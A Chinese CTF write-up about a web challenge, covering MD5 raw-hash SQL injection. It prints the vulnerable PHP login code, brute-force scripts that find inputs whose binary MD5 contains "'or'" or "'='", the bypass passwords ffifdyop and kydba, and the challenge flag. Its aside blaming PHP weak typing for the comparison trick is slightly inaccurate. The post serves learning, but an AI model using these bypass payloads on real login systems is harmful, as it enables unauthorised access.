---
title: MD5哈希注入
date: 2020-04-15
image: 
description: 
categories: 
- ctf_writeup
tags:
- SQLi
---
在网上看到一道CTF题目：https://ctf.show/challenges#web9

打开后扫目录发现robots.txt，里面提示了index.phps，下载，审计，发现MD5哈希注入：

```
<?php
    $flag="";
    $password=$_POST['password'];
    if(strlen($password)>10){
      die("password error");
    }
    $sql="select * from user where username ='admin' and password ='".md5($password,true)."'";
    $result=mysqli_query($con,$sql);
    if(mysqli_num_rows($result)>0){
        while($row=mysqli_fetch_assoc($result)){
           echo "登陆成功<br>";
           echo $flag;
        }
    }
?>
```

问题出在第7行`md5($password,true)`，密码使用了 md5 以二进制形式加密后进行在数据库中进行查询，若查询到了数据，就返回成功。

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165922.png)

 

第一种方法是将加密后的密码构造出类似 ' or '1' 的形式

```
<?php

    $v = 'a';

    $payload2 = "'or'";
    while(1){
        $hash = hash("md5",$v,true);
        if(substr_count($hash, $payload2) == 1){
            die($v);     
        }
        $v++;
    }

?>
```

这是网上的脚本不过我倒是没跑出来。。。

这里 `$v++` 其实是按照 ascii 字符进行后移的；

最后可以得到一个结果 `ffifdyop`，（还有一个是`129581926211651571912466741651878684928`）

将这个加密回去试试，看到确实是`'or'`的形式

那么只要我们随意输入一个用户名，密码为 `ffifdyop` 那么这样我们的语句就变成了：

```
select * from users where user = 'admin' and password = ''or'6蒥欓!r,b'
```

这样就可成功绕过判断。

 

还有一个构造的方法是构造 `'='` 的形式，也就是

```
select * from users where user = 'admin' and password = ''=''
```

为什么这样构造可以呢？因为 `password = ''=''` 中，先判断 `password =''` ，这个肯定是返回 0 的，因为 password 中没有`''`这个字段值，前面返回 0 以后，再和后面的等号做比较：`0 = ''`

因为后面的根据 php 的弱类型进行判断，0 和字符串比较始终返回 1

所以整个 sql 语句就相当于：

```
select * from users where user = 'admin' and 1
```

所以与上面的 'or' 不同的是，这个需要传入一个存在的用户名才可以正常绕过：

```
//by wh1sper
<?php

$v = 'a';

//die(md5('kydba',true));

$payload2 = "'='";
while(1){
    $hash = hash("md5",$v,true);
    if(preg_match("/^$payload2/i", $hash)){
        die($v);
    }
    $v++;
}
```

得到结果是`kydba`，加密回去是`'='NJ��s��5�z��@`

flag{9e92802a-684e-4115-bbe8-f3fdbbf71339}